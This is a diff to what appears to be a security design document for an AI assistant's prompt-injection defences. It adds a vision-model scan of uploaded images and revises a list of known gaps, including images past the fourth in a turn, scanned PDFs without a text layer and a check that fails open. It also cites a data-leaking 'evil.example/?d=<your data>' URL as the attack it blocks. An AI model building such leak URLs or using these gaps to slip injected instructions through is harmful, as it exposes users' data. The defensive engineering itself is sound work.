@@ -66,7 +66,7 @@ configures tool by tool.
 | Input sanitizer | *Direct* attempts — read through disguises (look-alike letters, invisible characters, leetspeak, spacing, base64). Refuses the whole message; never rewrites it. | `core/safety/security.py`, `core/http/middleware.py` |
 | Taint flag | A tool result that addresses an AI marks the turn; `auto` then asks before anything irreversible, and memory becomes read-only. Patterns first; then, in an `auto`/`full` turn with no pattern hit, a model is asked about each new untrusted result (plain prose passes the patterns). A hit taints the turn; the model fails open, verdicts are cached in memory (512, LRU), and `ask`/`review` never ask. | `core/safety/provenance.py::instruction_shaped`, `core/safety/moderation.py::injection_check` / `first_injection`, `chat/turn/agent.py::_model_taint` |
 | Enclosed third-party text | Every tool result and uploaded file reaches the model inside `<untrusted_data source="…" tag="…">`. The tag is random per request, and any envelope marker inside the text is neutralised, so a page cannot close its own envelope. A tool whose output is only ours declares `trusted_output=True` (clock, planning, charts, ask) and is not enclosed. Refusals are our own sentences and are never enclosed. The tag is made once per run and kept across an approval pause and resume, so every envelope in a run shares one tag. | `core/safety/provenance.py::wrap_untrusted`, `chat/turn/agent.py::enclose_result`, `chat/tools/registry.py` (`trusted_output`) |
-| Uploads and search seeds | An uploaded file's text, and the result of a `/search` or `/research` seed that runs before the first model call, are enclosed and scanned like a tool result. Patterns run in every mode; in `auto`/`full` the model is asked when they find nothing. A hit taints the turn as `upload`, or as the seed's tool name. A raw PDF or office file (sent as a file block, not wrapped) is scanned through its extracted text the same way, and the question carries one trusted line saying attached files are third-party content. | `chat/turn/pipeline.py` (`initial_taint`), `chat/turn/agent.py::_describe_attachment_for_text_model`, `chat/turn/agent.py::prepare_attachments` (`scan_text`) |
+| Uploads and search seeds | An uploaded file's text, and the result of a `/search` or `/research` seed that runs before the first model call, are enclosed and scanned like a tool result. Patterns run in every mode; in `auto`/`full` the model is asked when they find nothing. A hit taints the turn as `upload`, or as the seed's tool name. A raw PDF or office file (sent as a file block, not wrapped) is scanned through its extracted text the same way, and the question carries one trusted line saying attached files are third-party content. A raw image is read by a vision model (`meta-llama/llama-4-scout`) in `auto`/`full`, up to four a turn; a hit taints the turn as `upload`. | `chat/turn/pipeline.py` (`initial_taint`), `chat/turn/agent.py::_describe_attachment_for_text_model`, `chat/turn/agent.py::prepare_attachments` (`scan_text`), `chat/turn/agent.py::check_raw_images`, `core/safety/moderation.py::image_injection_check` |
 | Taint carried by workers | A worker started from a tainted turn starts tainted. A delegation whose own brief reads like orders starts tainted as `delegated task`. The taint is stored on the run's log, so a worker resumed after an approval comes back tainted. It only widens: a later clean result does not clear it. | `agents/agent/runtime.py::run_agent` (`inherited_taint`), `_remember_taint`, `chat/tools/agents.py`, `chat/tools/tasks.py` |
 | URL provenance | Stops the "open `evil.example/?d=<your data>`" leak: a composed URL carrying data is refused unless the user or a tool result supplied it. | `provenance.check_fetch` |
 | No auto-loading images | A remote image in a reply is a link, never an `<img>`. | `MarkdownMessage.tsx` |
@@ -218,11 +218,13 @@ Stated plainly, so nobody reads this as "solved":
 8. **A wrong solution can spread in an org.** An honest mistake saved as a
    fix is offered to colleagues until flagged. Ranking demotes failures;
    owners/admins/curators can retract.
-9. **Raw images and scanned PDFs are not scanned.** Raw PDFs and office files
-   sent as file blocks are now scanned through their extracted text (2026-11-24),
-   in every mode, like described text. Still unscanned: a picture sent to the
-   model as an image block (text written into it is seen only by the model
-   itself), and a scanned PDF with no text layer.
+9. **Scanned PDFs with no text layer are not scanned.** Raw PDFs and office
+   files sent as file blocks are scanned through their extracted text
+   (2026-11-24), in every mode, like described text. Raw images are checked by a
+   vision model in `auto`/`full` (2026-11-25, H-178): up to four a turn, cached
+   by hash, fail open. Still open: a picture past the fourth in one turn, and a
+   scanned PDF with no text layer (its pages are not rendered and read yet). A
+   timeout or a provider error on the vision check passes the image.
 10. **Closed (2026-11-24): the envelope tag changed on a resume.** The tag
     now rides in graph state and a resumed run keeps it (H-176).
 11. **Sandbox runs share one container and one kernel.** Slots keep files,
@@ -273,6 +275,7 @@ Stated plainly, so nobody reads this as "solved":
 | Sanitizer | `core/tests/test_sanitizer.py` |
 | Provenance, taint, URLs | `core/tests/test_provenance.py`, `chat/tests/test_injection_defences.py` |
 | Model injection check (tool results, seeds, uploads) | `chat/tests/test_injection_model_check.py` |
+| Vision injection check (raw images) | `chat/tests/test_image_injection_check.py` |
 | Raw documents scanned through their text; envelope tag across a resume | `chat/tests/test_raw_document_scan.py`, `chat/tests/test_untrusted_envelope.py` |
 | Content policy, labels, outbound | `core/tests/test_content_policy.py` |
 | Memory, image prompts, CAPTCHA, publishing | `chat/tests/test_safety_guards.py` |
